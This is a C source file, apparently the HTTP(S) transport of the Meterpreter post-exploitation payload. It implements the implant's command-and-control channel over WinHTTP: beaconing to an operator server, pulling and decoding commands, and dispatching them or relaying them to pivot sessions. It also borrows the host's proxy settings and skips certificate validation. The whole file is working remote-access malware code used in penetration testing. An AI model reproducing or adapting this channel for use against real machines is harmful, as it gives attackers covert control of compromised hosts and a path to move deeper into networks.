/*!
 * @file server_transport_http.c
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "metsrv.h"
#include "server_transport_wininet.h"
#include <winhttp.h>
#include "packet_encryption.h"
#include "pivot_packet_dispatch.h"
#include "server_http_utils.h"

#ifdef DEBUGTRACE
#define DBG_PRINT_OPTIONS(t, o) debug_print_http_options(t, o)
#else
#define DBG_PRINT_OPTIONS(t, o)
#endif

/*!
 * @brief Prepare a winHTTP request with the given context.
 * @param ctx Pointer to the HTTP transport context to prepare the request from.
 * @param isGet Indication of whether this request is a GET request, otherwise POST is used.
 * @param direction String representing the direction of the communications (for debug).
 * @return An Internet request handle.
 */
static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, const char *direction)
{
	HINTERNET hReq = NULL;
	DWORD flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

	if (ctx->ssl)
	{
		flags |= WINHTTP_FLAG_SECURE;
		dprintf("[%s] Setting secure flag..", direction);
	}

	HttpConnection* conn = isGet ? &ctx->get_connection : &ctx->post_connection;

	PWSTR uri = generate_uri(ctx, conn);

	vdprintf("[%s] opening request on connection %x to %S", direction, conn->connection, uri);
	hReq = WinHttpOpenRequest(conn->connection, isGet ? L"GET" : L"POST", uri, NULL, NULL, NULL, flags);

	free(uri);

	if (hReq == NULL)
	{
		dprintf("[%s] Failed WinHttpOpenRequest: %u", direction, GetLastError());
		SetLastError(ERROR_NOT_FOUND);
		return NULL;
	}

	// if no proxy is set, we should look to see if we can (and should) use the system
	// proxy settings for the given user.
	if (!ctx->proxy)
	{
		if (!ctx->proxy_configured)
		{
			WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ieConfig = { 0 };
			if (WinHttpGetIEProxyConfigForCurrentUser(&ieConfig))
			{
				dprintf("[PROXY] Got IE configuration");
				dprintf("[PROXY] AutoDetect: %s", ieConfig.fAutoDetect ? "yes" : "no");
				dprintf("[PROXY] Auto URL: %S", ieConfig.lpszAutoConfigUrl);
				dprintf("[PROXY] Proxy: %S", ieConfig.lpszProxy);
				dprintf("[PROXY] Proxy Bypass: %S", ieConfig.lpszProxyBypass);

				if (ieConfig.lpszAutoConfigUrl || ieConfig.fAutoDetect)
				{
					WINHTTP_AUTOPROXY_OPTIONS autoProxyOpts = { 0 };
					WINHTTP_PROXY_INFO proxyInfo = { 0 };

					if (ieConfig.fAutoDetect)
					{
						dprintf("[PROXY] IE config set to autodetect with DNS or DHCP");

						autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
						autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
						autoProxyOpts.lpszAutoConfigUrl = 0;
					}
					else if (ieConfig.lpszAutoConfigUrl)
					{
						dprintf("[PROXY] IE config set to autodetect with URL %S", ieConfig.lpszAutoConfigUrl);

						autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
						autoProxyOpts.dwAutoDetectFlags = 0;
						autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl;
					}
					autoProxyOpts.fAutoLogonIfChallenged = TRUE;

					if (WinHttpGetProxyForUrl(conn->internet, ctx->url, &autoProxyOpts, &proxyInfo))
					{
						ctx->proxy_for_url = calloc(1, sizeof(WINHTTP_PROXY_INFO));
						memcpy(ctx->proxy_for_url, &proxyInfo, sizeof(WINHTTP_PROXY_INFO));
					}
				}
				else if (ieConfig.lpszProxy)
				{
					WINHTTP_PROXY_INFO* proxyInfo = (WINHTTP_PROXY_INFO*)calloc(1, sizeof(WINHTTP_PROXY_INFO));
					ctx->proxy_for_url = proxyInfo;

					dprintf("[PROXY] IE config set to proxy %S with bypass %S", ieConfig.lpszProxy, ieConfig.lpszProxyBypass);

					proxyInfo->dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
					proxyInfo->lpszProxy = ieConfig.lpszProxy;
					proxyInfo->lpszProxyBypass = ieConfig.lpszProxyBypass;

					// stop the cleanup code from removing these as we're using them behind the scenes and they will
					// be freed later instead.
					ieConfig.lpszProxy = NULL;
					ieConfig.lpszProxyBypass = NULL;;
				}

				if (ieConfig.lpszAutoConfigUrl)
				{
					GlobalFree(ieConfig.lpszAutoConfigUrl);
				}
				if (ieConfig.lpszProxy)
				{
					GlobalFree(ieConfig.lpszProxy);
				}
				if (ieConfig.lpszProxyBypass)
				{
					GlobalFree(ieConfig.lpszProxyBypass);
				}
			}

			// mark as "configured" so we don't attempt to do this horrible PoS mess again.
			ctx->proxy_configured = TRUE;
		}

		if (ctx->proxy_for_url &&
			!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY, ctx->proxy_for_url, sizeof(WINHTTP_PROXY_INFO)))
		{
			dprintf("[%s] Unable to set proxy options: %u", GetLastError());
		}
	}
	else
	{
		if (ctx->proxy_user)
		{
			dprintf("[%s] Setting proxy username to %S", direction, ctx->proxy_user);
			if (!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY_USERNAME, ctx->proxy_user, (DWORD)(wcslen(ctx->proxy_user))))
			{
				dprintf("[%s] Failed to set username %u", direction, GetLastError());
			}
		}
		if (ctx->proxy_pass)
		{
			dprintf("[%s] Setting proxy password to %S", direction, ctx->proxy_pass);
			if (!WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY_PASSWORD, ctx->proxy_pass, (DWORD)(wcslen(ctx->proxy_pass))))
			{
				dprintf("[%s] Failed to set password %u", direction, GetLastError());
			}
		}
	}

	if (ctx->ssl)
	{
		flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
			| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
			| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
			| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
		if (!WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
		{
			dprintf("[%s] failed to set the security flags on the request", direction);
		}
	}

	return hReq;
}

/*
 * @brief Wrapper around WinHTTP-specific request handle closing functionality.
 * @param hReq HTTP request handle.
 * @return An indication of the result of sending the request.
 */
static BOOL close_request_winhttp(HANDLE hReq)
{
	return WinHttpCloseHandle(hReq);
}

/*!
 * @brief Wrapper around WinHTTP-specific response data reading functionality.
 * @param hReq HTTP request handle.
 * @param buffer Pointer to the data buffer.
 * @param bytesToRead The number of bytes to read.
 * @param bytesRead The number of bytes actually read.
 * @return An indication of the result of sending the request.
 */
static BOOL read_response_winhttp(HANDLE hReq, LPVOID buffer, DWORD bytesToRead, LPDWORD bytesRead)
{
	return WinHttpReadData(hReq, buffer, bytesToRead, bytesRead);
}

/*
 * @brief Write a given payload to an open outbound HTTP request.
 * @param hReq Handle to the open HTTP request.
 * @param buffer Pointer to a buffer containing the data. Can be NULL.
 * @param size Number of bytes to write from the \c buffer memory location.
 * @return Indication of success/failure.
 * @details This helper function is used to write data to outbound requests in batches, and is
 * useful for when there are payload prefixes and suffixes in use. It can be called with
 * \c NULL pointers and \c 0 size values so that the caller doesn't have to check for the
 * validity of data sources.
 */
static BOOL write_to_request(HANDLE hReq, LPVOID buffer, DWORD size)
{
	while (buffer != NULL && size > 0)
	{
		LPBYTE data = (LPBYTE)buffer;
		DWORD written = 0;
		dprintf("[WINHTTP] writing data to request. %u (0x%x) from %p", size, size, data + written);
		if (!WinHttpWriteData(hReq, data + written, size, &written))
		{
			return FALSE;
		}
		size -= written;
	}
	return TRUE;
}

/*!
 * @brief Wrapper around WinHTTP-specific sending functionality.
 * @param ctx Pointer to the current HTTP transport context.
 * @param hReq HTTP request handle.
 * @param conn Pointer to the GET/POST connection config.
 * @param buffer Pointer to the buffer to receive the data.
 * @param size Buffer size.
 * @return An indication of the result of sending the request.
 */
static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, HttpConnection* conn, LPVOID buffer, DWORD size)
{
	BOOL result = FALSE;

	PWSTR headers = generate_headers(ctx, conn);
	DWORD headerLength = headers == NULL ? 0 : -1L;

	DWORD totalSize = size + conn->options.payload_prefix_size + conn->options.payload_suffix_size;

	// Start a request without including any data
	if (WinHttpSendRequest(hReq, headers, headerLength, NULL, 0, totalSize, 0))
	{
		dprintf("[WINHTTP] Sending prefix");
		// Then write the prefix first
		if (write_to_request(hReq, conn->options.payload_prefix, conn->options.payload_prefix_size))
		{
			dprintf("[WINHTTP] Sending payload");
			// .. then the body
			if (write_to_request(hReq, buffer, size))
			{
				dprintf("[WINHTTP] Sending suffix");
				// .. then the suffix
				result = write_to_request(hReq, conn->options.payload_suffix, conn->options.payload_suffix_size);
			}
		}
	}
	else
	{
		dprintf("[WINHTTP] WinHttpSendRequestFailed: %u 0x%x", GetLastError(), GetLastError());
	}

	SAFE_FREE(headers);

	return result;
}

/*!
 * @brief Wrapper around WinHTTP-specific receiving functionality.
 * @param hReq HTTP request handle.
 * @return An indication of the result of receiving the request.
 */
static BOOL receive_response_winhttp(HANDLE hReq)
{
	return WinHttpReceiveResponse(hReq, NULL);
}

/*!
 * @brief Wrapper around WinHTTP-specific request response validation.
 * @param hReq HTTP request handle.
 * @param ctx The HTTP transport context.
 * @param contentLength Pointer to a DWORD receiving the content length of the response.
 * @return An indication of the result of getting a response.
 */
static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx, LPDWORD contentLength)
{
	DWORD statusCode;
	DWORD statusCodeSize = sizeof(statusCode);
	vdprintf("[PACKET RECEIVE WINHTTP] Getting the result code...");
	if (WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX))
	{
		vdprintf("[PACKET RECEIVE WINHTTP] Returned status code is %d", statusCode);

		// did the request succeed?
		if (statusCode != 200)
		{
			// There are a few reasons why this could fail, including proxy related stuff.
			// If we fail, we're going to fallback to WinINET and see if that works instead.
			// there could be a number of reasons for failure, but we're only going to try
			// to handle the case where proxy authentication fails. We'll indicate failure and
			// let the switchover happen for us.

			// However, we won't do this in the case where cert hash verification is turned on,
			// because we don't want to expose people to MITM if they've explicitly asked us not
			// to.
			if (ctx->cert_hash == NULL && statusCode == 407)
			{
				return ERROR_WINHTTP_CANNOT_CONNECT;
			}

			// indicate something is up.
			return ERROR_BAD_CONFIGURATION;
		}
	}
	else
	{
		vdprintf("[PACKET RECEIVE WINHTTP] Getting result code failed: %u 0x%x", GetLastError(), GetLastError());
	}

	if (ctx->cert_hash != NULL)
	{
		vdprintf("[PACKET RECEIVE WINHTTP] validating certificate hash");
		PCERT_CONTEXT pCertContext = NULL;
		DWORD dwCertContextSize = sizeof(pCertContext);

		if (!WinHttpQueryOption(hReq, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCertContext, &dwCertContextSize))
		{
			dprintf("[PACKET RECEIVE WINHTTP] Failed to get the certificate context: %u", GetLastError());
			return ERROR_WINHTTP_SECURE_INVALID_CERT;
		}

		DWORD dwHashSize = 20;
		BYTE hash[20];
		if (!CertGetCertificateContextProperty(pCertContext, CERT_SHA1_HASH_PROP_ID, hash, &dwHashSize))
		{
			dprintf("[PACKET RECEIVE WINHTTP] Failed to get the certificate hash: %u", GetLastError());
			return ERROR_WINHTTP_SECURE_INVALID_CERT;
		}

		if (memcmp(hash, ctx->cert_hash, CERT_HASH_SIZE) != 0)
		{
			dprintf("[SERVER] Server hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
				hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
				hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);

			dprintf("[PACKET RECEIVE WINHTTP] Certificate hash doesn't match, bailing out");
			return ERROR_WINHTTP_SECURE_INVALID_CERT;
		}
	}

	// if we get here, then we should be good to look at the content length
	DWORD size = sizeof(DWORD);

	WinHttpQueryHeaders(hReq, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX, contentLength, &size, WINHTTP_NO_HEADER_INDEX);
	return GetLastError();
}

/*!
 * @brief Transmit a packet via HTTP(s) using winhttp _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPacketLength)
{
	DWORD dwResult = ERROR_SUCCESS;
	HINTERNET hReq;
	BOOL res;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
	LPBYTE encodedPacket = NULL;
	DWORD encodedPacketLength = 0;

	BOOL freeEncodedPacket = encode_raw_packet(ctx, rawPacket, rawPacketLength, &encodedPacket, &encodedPacketLength);

	lock_acquire(remote->lock);

	do
	{
		hReq = ctx->create_req(ctx, FALSE, "PACKET TRANSMIT");
		if (hReq == NULL)
		{
			BREAK_ON_ERROR("[PACKET TRANSMIT HTTP] Failed create_req");
		}

		dprintf("[PACKET TRANSMIT HTTP] Request created, sending via POST");
		res = ctx->send_req(ctx, hReq, &ctx->post_connection, encodedPacket, encodedPacketLength);
		if (!res)
		{
			BREAK_ON_ERROR("[PACKET TRANSMIT HTTP] Failed send_req");
		}

		dprintf("[PACKET TRANSMIT HTTP] request sent.. apparently");
		res = ctx->receive_response(hReq);
		if (!res)
		{
			BREAK_ON_ERROR("[PACKET TRANSMIT HTTP] Failed receive_response");
		}

		dprintf("[PACKET TRANSMIT HTTP] response received. Apparently. %u", GetLastError());
	} while(0);

	ctx->close_req(hReq);

	if (freeEncodedPacket)
	{
		SAFE_FREE(encodedPacket);
	}

	lock_release(remote->lock);

	return dwResult;
}

/*!
 * @brief Receive a new packet via one of the HTTP libs (WinInet or WinHTTP).
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_receive_http(Remote *remote, Packet **packet)
{
	DWORD result = ERROR_SUCCESS;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
	DWORD retries = 5;

	lock_acquire(remote->lock);

	HINTERNET hReq = ctx->create_req(ctx, TRUE, "PACKET RECEIVE");
	if (hReq == NULL)
	{
		result = GetLastError();
		goto out;
	}

	vdprintf("[PACKET RECEIVE HTTP] sending GET");

	if (!ctx->send_req(ctx, hReq, &ctx->get_connection, NULL, 0))
	{
		dprintf("[PACKET RECEIVE HTTP] Failed send_req: %d %d", GetLastError(), WSAGetLastError());
		result = ERROR_NOT_FOUND;
		goto out;
	}

	vdprintf("[PACKET RECEIVE HTTP] Waiting to see the response ...");
	if (ctx->receive_response && !ctx->receive_response(hReq))
	{
		vdprintf("[PACKET RECEIVE] Failed receive: %d", GetLastError());
		result = ERROR_NOT_FOUND;
		goto out;
	}

	DWORD contentLength = 0;
	result = ctx->validate_response(hReq, ctx, &contentLength) != ERROR_SUCCESS;
	if (result != ERROR_SUCCESS)
	{
		vdprintf("[PACKET RECEIVE] Validation failed: %d", result);
		goto out;
	}
	dprintf("[PACKET RECEIVE] Response is valid, content length is: %d", contentLength);

	if (contentLength == 0)
	{
		dprintf("[PACKET RECEIVE] No data in body, bailing out");
		result = ERROR_EMPTY;
		goto out;
	}

	DWORD bytesRead = 0;
	DWORD bytesTotal = 0;
	LPBYTE body = (LPBYTE)calloc(contentLength, sizeof(BYTE));
	while (bytesTotal < contentLength && retries > 0)
	{
		dprintf("[PACKET RECEIVE] Trying to read bytes: %d", contentLength - bytesTotal);

		if (!ctx->read_response(hReq, body + bytesTotal, contentLength - bytesTotal, &bytesRead))
		{
			dprintf("[PACKET RECEIVE HTTP] Failed read_response: %d", GetLastError());
			result = ERROR_NOT_FOUND;
			goto out;
		}

		if (bytesRead == 0)
		{
			--retries;
			continue;
		}
		bytesTotal += bytesRead;
	}

	if (bytesTotal != contentLength)
	{
		vdprintf("[PACKET RECEIVE] Failed read response: %d", GetLastError());
		result = ERROR_NOT_FOUND;
		goto out;
	}

	dprintf("[PACKET RECEIVE HTTP] Content has been read.");

	// if there's data to skip at the start of the response, move the packet data
	// to the front of the buffer
	UINT skipCount = ctx->get_connection.options.payload_prefix_skip;
	if (skipCount == 0)
	{
		skipCount = ctx->default_options.payload_prefix_skip;
	}
	dprintf("[PACKET RECEIVE HTTP] Skipping prefix bytes: %d", skipCount);
	if (skipCount > 0)
	{
		memmove_s(body, contentLength, body + skipCount, contentLength - skipCount);
		contentLength -= skipCount;
	}

	// Then adjust the length to consider based on the suffix skip
	skipCount = ctx->get_connection.options.payload_suffix_skip;
	if (skipCount == 0)
	{
		skipCount = ctx->default_options.payload_suffix_skip;
	}
	dprintf("[PACKET RECEIVE HTTP] Skipping suffix bytes: %d", skipCount);
	contentLength -= skipCount;

	if (contentLength == 0)
	{
		// After stripping our prefix/suffix, we have nothing left.
		dprintf("[PACKET RECEIVE] No data in body post-skipping, bailing out");
		result = ERROR_EMPTY;
		goto out;
	}

	// The packet data has been read, but could be encoded based on the C2, so decode it first
	LPBYTE packetData = NULL;
	DWORD packetDataSize = 0;
	BOOL freePacketData = decode_encoded_packet(ctx, body, contentLength, &packetData, &packetDataSize);

	// We're now ready to handle the packet directly. Check the header info before we move forward.
	PacketHeader header = *(PacketHeader*)packetData;
	xor_bytes(header.xor_key, (PBYTE)&header + sizeof(header.xor_key), sizeof(header) - sizeof(header.xor_key));

#ifdef DEBUGTRACE
	PUCHAR h = (PUCHAR)&header.session_guid[0];
	dprintf("[HTTP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
		h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
#endif

	if (is_null_guid(header.session_guid) || memcmp(remote->session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
	{
		dprintf("[HTTP] Session GUIDs match (or packet guid is null), decrypting packet");
		result = decrypt_packet(remote, packet, packetData, packetDataSize);
	}
	else
	{
		dprintf("[HTTP] Session GUIDs don't match, looking for a pivot");
		PivotContext* pivotCtx = pivot_tree_find(remote->pivot_sessions, header.session_guid);
		if (pivotCtx != NULL)
		{
			dprintf("[HTTP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)");
			result = pivot_packet_dispatch(pivotCtx, packetData, packetDataSize);

			// mark this packet buffer as NULL as the thread will clean it up
			packetData = NULL;
			*packet = NULL;
		}
		else
		{
			dprintf("[HTTP] Session GUIDs don't match, can't find pivot!");
		}
	}

	if (freePacketData)
	{
		SAFE_FREE(packetData);
	}

out:

	dprintf("[HTTP] Cleaning up");
	if (hReq)
	{
		ctx->close_req(hReq);
	}

	lock_release(remote->lock);

	dprintf("[HTTP] Packet receive finished");

	return result;
}

/*!
 * @brief Initialise a connection to a remote web server using WinHTTP.
 * @param ctx Pointer to the current \c HttpTransportContext.
 * @param conn Pointer to the \c HttpConnection config.
 * @param host Name of the host to connect to.
 * @param port Port number to connect on.
 * @return Indication of success or failure.
 */
static DWORD server_init_connection(HttpTransportContext* ctx, HttpConnection* conn, PWSTR host, INTERNET_PORT port)
{
	// configure proxy
	dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
	PWSTR userAgent = conn->options.ua ? conn->options.ua : ctx->default_options.ua;

	if (ctx->proxy)
	{
		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
		conn->internet = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
	}
	else
	{
		conn->internet = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	}

	if (!conn->internet)
	{
		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
		return GetLastError();
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", conn->internet);


	// Allocate the connection handle
	conn->connection = WinHttpConnect(conn->internet, host, port, 0);
	if (!conn->connection)
	{
		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
		return GetLastError();
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", conn->connection);

	return ERROR_SUCCESS;
}

/*!
 * @brief Initialise the HTTP(S) connection.
 * @param transport Pointer to the transport instance.
 * @return Indication of success or failure.
 */
static DWORD server_init_winhttp(Transport* transport)
{
	dprintf("[WINHTTP] Initialising ...");

	URL_COMPONENTS bits;
	wchar_t tmpHostName[URL_SIZE];
	wchar_t tmpUrlPath[URL_SIZE];
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	// The InternetCrackUrl method was poorly designed...
	ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = URL_SIZE - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URL_SIZE - 1;
	bits.lpszUrlPath = tmpUrlPath;

	dprintf("[DISPATCH] About to crack URL: %S", transport->url);
	WinHttpCrackUrl(transport->url, 0, 0, &bits);

	SAFE_FREE(ctx->default_options.uri);
	ctx->default_options.uri = _wcsdup(tmpUrlPath);

	dprintf("[DISPATCH] Configured URI: %S", ctx->default_options.uri);
	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);

	DWORD result = server_init_connection(ctx, &ctx->get_connection, tmpHostName, bits.nPort);
	result = server_init_connection(ctx, &ctx->post_connection, tmpHostName, bits.nPort) && result;

	transport->comms_last_packet = current_unix_timestamp();

	return result;
}

/*!
 * @brief Close off any connection resource handles.
 * @param ctx Pointer ot the current \c HttpTransportContext.
 * @param conn Pointer ot the current \c HttpConnection.
 * @return Indication of success or failure.
 */
static void close_connection(HttpTransportContext* ctx, HttpConnection* conn)
{
	if (conn != NULL)
	{
		if (conn->connection != NULL)
		{
			ctx->close_req(conn->connection);
			conn->connection = NULL;
		}
		if (conn->internet != NULL)
		{
			ctx->close_req(conn->internet);
			conn->internet = NULL;
		}
	}
}

/*!
 * @brief Deinitialise the HTTP(S) connection.
 * @param transport Pointer to the current \c Transport instance with the HTTP(S) transport details wired in.
 * @return Indication of success or failure.
 */
static DWORD server_deinit_http(Transport* transport)
{
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	dprintf("[HTTP] Deinitialising ...");

	close_connection(ctx, &ctx->get_connection);
	close_connection(ctx, &ctx->post_connection);

	// have we had issues that require us to move?
	if (ctx->move_to_wininet)
	{
		// yes, so switch on over.
		transport_move_to_wininet(transport);
		ctx->move_to_wininet = FALSE;
	}

	return TRUE;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using HTTP(S).
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet* packet = NULL;
	THREAD* cpt = NULL;
	DWORD ecount = 0;
	DWORD delay = 0;
	Transport* transport = remote->transport;
	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

	while (running)
	{
		if (transport->timeouts.comms != 0 && transport->comms_last_packet + transport->timeouts.comms < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->sess_expiry_end != 0 && remote->sess_expiry_end < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->sess_expiry_end);
			break;
		}

		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive_http(remote, &packet);

		if (result != ERROR_SUCCESS)
		{
			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				transport->comms_last_packet = current_unix_timestamp();
			}
			else if (result == ERROR_WINHTTP_CANNOT_CONNECT)
			{
				dprintf("[DISPATCH] Failed to work correctly with WinHTTP, moving over to WinINET");
				// next we need to indicate that we need to do a switch to wininet when we terminate
				ctx->move_to_wininet = TRUE;

				// and pretend to do a transport switch, to ourselves!
				remote->next_transport = remote->transport;
				result = ERROR_SUCCESS;
				break;
			}
			else if (result == ERROR_WINHTTP_SECURE_INVALID_CERT)
			{
				// This means that the certificate validation failed, and so
				// we don't trust who we're connecting with, so we need to move
				// on to another transport.
				// If we're the only transport, then we should wait for the allotted
				// time before trying again. Otherwise, we can just switch immediately.
				// This avoids spinning the process and making way too many requests
				// in a short period of time (ie. avoiding noise).
				if (remote->transport == remote->transport->next_transport)
				{
					remote->next_transport_wait = remote->transport->timeouts.retry_wait;
				}

				break;
			}
			else if (result == ERROR_BAD_CONFIGURATION)
			{
				// something went wrong with WinINET so break.
				break;
			}

			delay = 10 * ecount;
			if (ecount >= 10)
			{
				delay *= 10;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
		}
		else
		{
			transport->comms_last_packet = current_unix_timestamp();

			// Reset the empty count when we receive a packet
			ecount = 0;

			dprintf("[DISPATCH] Returned result: %d", result);

			if (packet != NULL)
			{
				running = command_handle(remote, packet);
				dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
			}
			else
			{
				dprintf("[DISPATCH] Packet was NULL, this indicates that it was a pivot packet");
			}
		}
	}

	return result;
}

/*!
 * @brief Destroy any configured HTTP options for the given request.
 * @param options Pointer to the \c HttpRequestOptions to clean up.
 */
static void destroy_options(HttpRequestOptions* options)
{
	SAFE_FREE(options->ua);
	SAFE_FREE(options->uri);
	SAFE_FREE(options->headers);
	SAFE_FREE(options->payload_prefix);
	SAFE_FREE(options->payload_suffix);
	SAFE_FREE(options->uuid_cookie);
	SAFE_FREE(options->uuid_header);
	SAFE_FREE(options->uuid_get);
}

/*!
 * @brief Destroy the HTTP(S) transport.
 * @param transport Pointer to the HTTP(S) transport to reset.
 */
static void transport_destroy_http(Transport* transport)
{
	if (transport && (transport->type & METERPRETER_TRANSPORT_HTTP))
	{
		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

		dprintf("[TRANS HTTP] Destroying http transport for url %S", transport->url);

		if (ctx)
		{
			SAFE_FREE(ctx->cert_hash);
			SAFE_FREE(ctx->proxy);
			SAFE_FREE(ctx->proxy_pass);
			SAFE_FREE(ctx->proxy_user);
			SAFE_FREE(ctx->uuid);

			destroy_options(&ctx->post_connection.options);
			destroy_options(&ctx->get_connection.options);
			destroy_options(&ctx->default_options);

			if (ctx->proxy_for_url)
			{
				WINHTTP_PROXY_INFO* proxyInfo = (WINHTTP_PROXY_INFO*)ctx->proxy_for_url;
				if (proxyInfo->lpszProxy)
				{
					GlobalFree(proxyInfo->lpszProxy);
				}
				if (proxyInfo->lpszProxyBypass)
				{
					GlobalFree(proxyInfo->lpszProxyBypass);
				}
			}
			SAFE_FREE(ctx->proxy_for_url);
		}
		SAFE_FREE(transport->url);
		SAFE_FREE(transport->ctx);
		SAFE_FREE(transport);
	}
}

/*!
 * @brief Write the given set of request options to the given TLV packet.
 * @param optionsPacket Pointer to the \c Packet to write all the TLV data to.
 * @param sourceOptions Pointer to the \c HttpRequestOptions that needs to be written.
 * @returns Indication of success or failure.
 */
BOOL set_http_options_to_tlv(Packet* optionsPacket, HttpRequestOptions* sourceOptions)
{
	if (sourceOptions->encode_flags != 0)
	{
		packet_add_tlv_uint(optionsPacket, TLV_TYPE_C2_ENC, sourceOptions->encode_flags);
	}
	if (sourceOptions->headers != NULL)
	{
		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_HEADERS, sourceOptions->headers);
	}
	if (sourceOptions->payload_prefix != NULL && sourceOptions->payload_prefix_size > 0)
	{
		packet_add_tlv_raw(optionsPacket, TLV_TYPE_C2_PREFIX, sourceOptions->payload_prefix, sourceOptions->payload_prefix_size);
	}
	if (sourceOptions->payload_prefix_skip > 0)
	{
		packet_add_tlv_uint(optionsPacket, TLV_TYPE_C2_PREFIX_SKIP, sourceOptions->payload_prefix_skip);
	}
	if (sourceOptions->payload_suffix_skip > 0)
	{
		packet_add_tlv_uint(optionsPacket, TLV_TYPE_C2_SUFFIX_SKIP, sourceOptions->payload_suffix_skip);
	}
	if (sourceOptions->payload_suffix != NULL && sourceOptions->payload_suffix_size > 0)
	{
		packet_add_tlv_raw(optionsPacket, TLV_TYPE_C2_SUFFIX, sourceOptions->payload_suffix, sourceOptions->payload_suffix_size);
	}
	if (sourceOptions->ua != NULL)
	{
		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_UA, sourceOptions->ua);
	}
	if (sourceOptions->uri != NULL)
	{
		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_URI, sourceOptions->uri);
	}
	if (sourceOptions->uuid_cookie != NULL)
	{
		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_UUID_COOKIE, sourceOptions->uuid_cookie);
	}
	if (sourceOptions->uuid_get != NULL)
	{
		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_UUID_GET, sourceOptions->uuid_get);
	}
